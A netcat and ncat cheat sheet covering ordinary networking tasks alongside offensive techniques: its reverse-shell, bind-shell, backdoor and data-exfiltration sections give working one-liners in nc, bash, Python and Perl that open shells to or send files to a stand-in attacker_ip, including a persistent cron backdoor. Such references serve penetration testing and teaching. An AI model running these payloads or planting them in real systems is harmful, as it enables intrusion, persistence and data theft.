# Netcat (nc) Cheat Sheet

Netcat is often referred to as the "Swiss Army knife" of networking tools. It can read and write data across network connections using TCP or UDP protocols.

## 📋 Table of Contents
- [Basic Syntax](#basic-syntax)
- [Connection Modes](#connection-modes)
- [Port Scanning](#port-scanning)
- [File Transfers](#file-transfers)
- [Banner Grabbing](#banner-grabbing)
- [Reverse Shells](#reverse-shells)
- [Bind Shells](#bind-shells)
- [Port Forwarding](#port-forwarding)
- [Proxying](#proxying)
- [Chat Server](#chat-server)
- [Advanced Techniques](#advanced-techniques)

## Basic Syntax

```bash
nc [options] [target] [port(s)]
```

Common options:
- `-l`: Listen mode (server)
- `-v`: Verbose mode
- `-vv`: Very verbose
- `-n`: Numeric-only IP addresses (no DNS)
- `-p`: Specify source port
- `-u`: UDP mode (default is TCP)
- `-w`: Timeout for connects and final net reads
- `-z`: Zero-I/O mode (scanning)
- `-e`: Execute program after connection

## Connection Modes

### Client Mode (Connect)

```bash
# Connect to a TCP port
nc example.com 80

# Connect to UDP port
nc -u example.com 53

# Connect with timeout
nc -w 5 example.com 80

# Connect without DNS resolution
nc -n 192.168.1.1 80
```

### Server Mode (Listen)

```bash
# Listen on TCP port
nc -l -p 1234

# Listen on TCP port (simplified)
nc -lvp 1234

# Listen on UDP port
nc -u -l -p 1234

# Listen and keep listening after client disconnect
nc -lk -p 1234

# Listen with verbose output
nc -lvp 1234
```

## Port Scanning

### Single Port Scan

```bash
# Scan single TCP port
nc -zv example.com 80

# Scan single UDP port
nc -zuv example.com 53
```

### Port Range Scan

```bash
# Scan TCP port range
nc -zv example.com 20-25

# Scan multiple ports
nc -zv example.com 22 80 443

# Fast scan with timeout
nc -zvw 1 example.com 1-1000

# Scan UDP ports
nc -zuv example.com 1-100
```

### Banner Grabbing

```bash
# Grab HTTP banner
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc example.com 80

# Grab SSH banner
nc example.com 22

# Grab FTP banner
nc example.com 21

# Grab SMTP banner
nc example.com 25

# Grab POP3 banner
nc example.com 110
```

## File Transfers

### Send File

```bash
# Receiver (on receiving machine)
nc -l -p 1234 > received_file.txt

# Sender (on sending machine)
nc example.com 1234 < file_to_send.txt

# Send with progress using pv
nc example.com 1234 < file.txt | pv

# Send entire directory (tar + netcat)
# Receiver
nc -l -p 1234 | tar xvf -
# Sender
tar cvf - /path/to/directory | nc example.com 1234
```

### Receive File

```bash
# Server receives file
nc -l -p 1234 > received.txt

# Client sends file
cat file.txt | nc example.com 1234

# Send binary file
nc -l -p 1234 > image.jpg
# From sender
nc -w 3 example.com 1234 < image.jpg
```

## Reverse Shells

A reverse shell is when the target machine connects back to the attacker's machine.

### Basic Reverse Shell

```bash
# Attacker's machine (listener)
nc -lvp 4444

# Target machine (victim)
nc attacker_ip 4444 -e /bin/bash

# Alternative without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 4444 >/tmp/f

# Using bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Using Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Using Perl
perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Reverse Shell with TTY

```bash
# After establishing reverse shell, spawn TTY
python -c 'import pty;pty.spawn("/bin/bash")'

# Or use script
script /dev/null

# Background the shell
Ctrl+Z

# Set terminal to raw mode
stty raw -echo; fg

# Reset terminal
reset

# Set terminal type
export TERM=xterm-256color
```

## Bind Shells

A bind shell is when the target machine listens on a port and the attacker connects to it.

```bash
# Target machine (victim) - listens
nc -lvp 4444 -e /bin/bash

# Attacker connects
nc victim_ip 4444

# Without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l -p 4444 >/tmp/f
```

## Port Forwarding

### Simple Port Forward

```bash
# Forward local port 8080 to remote port 80
mkfifo /tmp/pipe
nc -l -p 8080 < /tmp/pipe | nc remote_host 80 > /tmp/pipe
```

### Two-Way Port Forward

```bash
# Create named pipes
mkfifo backpipe

# Set up forwarding
nc -l 8080 0<backpipe | nc remote_host 80 1>backpipe
```

## Proxying

### HTTP Proxy

```bash
# Simple HTTP proxy
while true; do nc -l -p 8080 -c 'nc example.com 80'; done

# SOCKS proxy through netcat relay
nc -l -p 1080 | nc target 1080
```

### SSH Tunneling with Netcat

```bash
# Create SSH tunnel through netcat
ssh -o "ProxyCommand nc -X connect -x proxy_host:proxy_port %h %p" user@remote_host
```

## Chat Server

### Simple Chat

```bash
# Server
nc -l -p 1234

# Client
nc server_ip 1234

# Both can now type and send messages
```

### Multi-Client Chat (One-to-Many)

```bash
# Server with named pipe
mkfifo /tmp/chatpipe
nc -l -p 1234 < /tmp/chatpipe | tee /tmp/chatpipe

# Clients connect
nc server_ip 1234
```

## Advanced Techniques

### Web Server

```bash
# Simple HTTP server
while true; do nc -l -p 80 -q 1 < index.html; done

# HTTP server with proper headers
while true; do 
  echo -e "HTTP/1.1 200 OK\r\n\r\n$(cat index.html)" | nc -l -p 8080 -q 1
done
```

### Testing Services

```bash
# Test HTTP server
echo -e "GET / HTTP/1.0\r\n\r\n" | nc example.com 80

# Test SMTP server
nc example.com 25
HELO example.com
MAIL FROM: <test@example.com>
RCPT TO: <recipient@example.com>
DATA
Subject: Test
This is a test email.
.
QUIT

# Test POP3 server
nc example.com 110
USER username
PASS password
LIST
QUIT

# Test FTP server
nc example.com 21
USER anonymous
PASS password
LIST
QUIT
```

### Remote Command Execution

```bash
# Server executes commands
nc -l -p 1234 -e /bin/bash

# Client sends commands
nc server_ip 1234
ls -la
pwd
whoami
```

### Backdoor

```bash
# Persistent backdoor (cron job)
# Add to crontab: */5 * * * * /usr/bin/nc attacker_ip 4444 -e /bin/bash

# Hidden process backdoor
nohup nc -l -p 4444 -e /bin/bash &

# Backdoor with authentication
# Create script: auth_backdoor.sh
#!/bin/bash
read -p "Password: " pwd
if [ "$pwd" == "secret123" ]; then
    /bin/bash
else
    exit 1
fi

# Run it
nc -l -p 4444 -e ./auth_backdoor.sh
```

### Network Monitoring

```bash
# Packet capture simulation
nc -l -p 1234 | tee capture.log

# Network throughput test
# Server
nc -l -p 1234 > /dev/null
# Client
dd if=/dev/zero bs=1M count=100 | nc server_ip 1234

# Bandwidth test
# Server
nc -l -p 1234 | pv > /dev/null
# Client
dd if=/dev/zero bs=1M count=1000 | nc server_ip 1234
```

### Data Exfiltration

```bash
# Exfiltrate data over HTTP
# Listener
nc -l -p 80 > exfiltrated_data.txt

# Sender (looks like web traffic)
cat sensitive_data.txt | nc target_ip 80

# Exfiltrate over DNS (encoded)
# Note: This requires more complex setup

# Exfiltrate compressed data
tar czf - /path/to/data | nc attacker_ip 4444
```

### Clipboard Sharing

```bash
# Send clipboard to remote
# Receiver
nc -l -p 1234 | xclip -selection clipboard

# Sender
xclip -o -selection clipboard | nc target_ip 1234
```

### Remote Desktop Streaming

```bash
# Stream desktop (requires ffmpeg)
# Server
ffmpeg -f x11grab -video_size 1920x1080 -i :0.0 -f mpegts - | nc -l -p 1234

# Client
nc server_ip 1234 | ffplay -
```

## Ncat (Modern Netcat)

Ncat is the modern reimplementation of netcat from the Nmap project with additional features.

### SSL/TLS Support

```bash
# SSL server
ncat -l -p 1234 --ssl

# SSL client
ncat example.com 1234 --ssl

# SSL with certificate verification
ncat example.com 1234 --ssl --ssl-verify
```

### Access Control

```bash
# Allow specific IP
ncat -l -p 1234 --allow 192.168.1.100

# Deny specific IP
ncat -l -p 1234 --deny 192.168.1.100

# Allow from file
ncat -l -p 1234 --allowfile allowed_ips.txt
```

### Proxy Support

```bash
# Connect through HTTP proxy
ncat --proxy proxy_host:8080 --proxy-type http example.com 80

# Connect through SOCKS4 proxy
ncat --proxy proxy_host:1080 --proxy-type socks4 example.com 80

# Connect through SOCKS5 proxy
ncat --proxy proxy_host:1080 --proxy-type socks5 example.com 80
```

### Broker Mode (Multiple Clients)

```bash
# Chat server for multiple clients
ncat -l -p 1234 --broker

# Clients can all connect and chat
ncat server_ip 1234
```

## Practical Scenarios

### 1. Network Connectivity Test

```bash
# Test if port is open
nc -zv example.com 22

# Test multiple ports
nc -zv example.com 22 80 443

# Test UDP connectivity
nc -zuv example.com 53
```

### 2. Quick File Transfer

```bash
# Send file (receiver first)
nc -l -p 9999 > received_file.zip

# Then sender
nc receiver_ip 9999 < file_to_send.zip
```

### 3. Remote Backup

```bash
# Backup to remote server
tar czf - /home/user | nc backup_server 9999

# On backup server
nc -l -p 9999 | tar xzf -
```

### 4. Port Forwarding

```bash
# Forward local 8080 to remote 80
mkfifo pipe
nc -l -p 8080 < pipe | nc remote_host 80 > pipe
```

### 5. Simple Port Knocking

```bash
# Port knock sequence
nc -zv target 7000
nc -zv target 8000
nc -zv target 9000
# Now connect to service
nc target 22
```

## Security Considerations

⚠️ **Important Security Notes:**

1. **Netcat is unencrypted** - All data is sent in plaintext
2. **Use ncat with SSL** for encrypted communications
3. **Reverse shells bypass firewalls** - Be careful where you use them
4. **Always have authorization** before using netcat for security testing
5. **Monitor netcat usage** in production environments
6. **Disable -e flag** in production systems if possible

## Netcat Alternatives

- **Ncat**: Modern netcat with SSL support (part of Nmap)
- **Socat**: More advanced with bidirectional data transfer
- **Cryptcat**: Netcat with encryption
- **Powercat**: PowerShell implementation
- **Netcat-openbsd**: OpenBSD version with better security

## Resources

- [Netcat Manual](http://netcat.sourceforge.net/)
- [Ncat User Guide](https://nmap.org/ncat/guide/)
- [Netcat Cheat Sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)

